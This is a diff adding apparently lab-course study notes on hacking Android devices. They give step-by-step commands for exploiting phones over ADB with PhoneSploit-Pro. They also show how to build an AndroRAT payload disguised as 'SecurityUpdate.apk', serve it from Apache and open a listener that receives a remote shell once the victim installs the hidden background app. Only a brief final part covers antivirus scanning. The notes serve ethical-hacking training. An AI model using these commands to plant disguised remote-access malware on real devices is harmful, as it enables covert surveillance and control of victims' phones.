@@ -2429,3 +2429,65 @@ It’s basically a wrapper around the OpenAI API.
     ```
   - you did the practical        
 </details>
+
+# Hacking Mobile Platforms
+<details>
+<summary>Hack Android Devices</summary>
+
+* Exploit the Android Platform through ADB using PhoneSploit-Pro :~
+  - tool = phonesploit-pro
+  - open the parrot and sudo su for root user
+  - cd PhoneSploit-Pro
+  - command to run tool:
+    - python3 phonesploitpro.py
+  - PhoneSploit Pro main menu options appear
+  - you have so many option to get info about that android
+  - choose the option and get info of the android
+
+* Hack an Android Device by Creating APK File using AndroRAT :~
+  - tool = AndroRAT
+  - open the parrot and sudo su for root user
+  - cd AndroRAT
+  - run this command to create a apk file
+    ```console
+          python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk 
+    ```
+    - --build = is used for building the APK
+    - -i = specifies the local IP address (here, 10.10.1.13)
+    - -p = specifies the port number (here, 4444)
+    - -o = specifies the output APK file (here, SecurityUpdate.apk)   
+  - to create directory and give the root privillage to that directory and commands are in belowe
+    ```console
+          mkdir /var/www/html/share
+          chmod -R 755 /var/www/html/share
+          chown -R www-data:www-data /var/www/html/share
+    ```
+  - start the apache
+    - service apache2 start
+  - run this command for start listening to the victim machine
+    ```console
+          python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+    ```
+    - --shell = is used for getting the interpreter
+    - -i = specifies the IP address for listening (here, 0.0.0.0)
+    - -p = specifies the port number (here, 4444) 
+  - You can observe that AndroRAT starts waiting for a connection
+  - open the android and open the chrome and enter this url
+    ```console
+          http://<host_ip>/share
+    ```
+  - download that file and install that file and accept all the permissions 
+  - open that apk it will open but it is invisible but run in background
+  - go back to the parrot machine the interpreter session will open in the terminal
+  - type the help command you can see so many option in their 
+  - you can get all target device informations                
+</details>
+
+<details>
+<summary>Secure Android Devices using Various Android Security Tools</summary>
+
+* Secure Android Devices from Malicious Apps using AVG :~
+  - open the AGV antivirus app and click start scanning 
+  - after scanning it will give the report of is their any malware and threats 
+  - after that you can fix this and delete this
+</details>
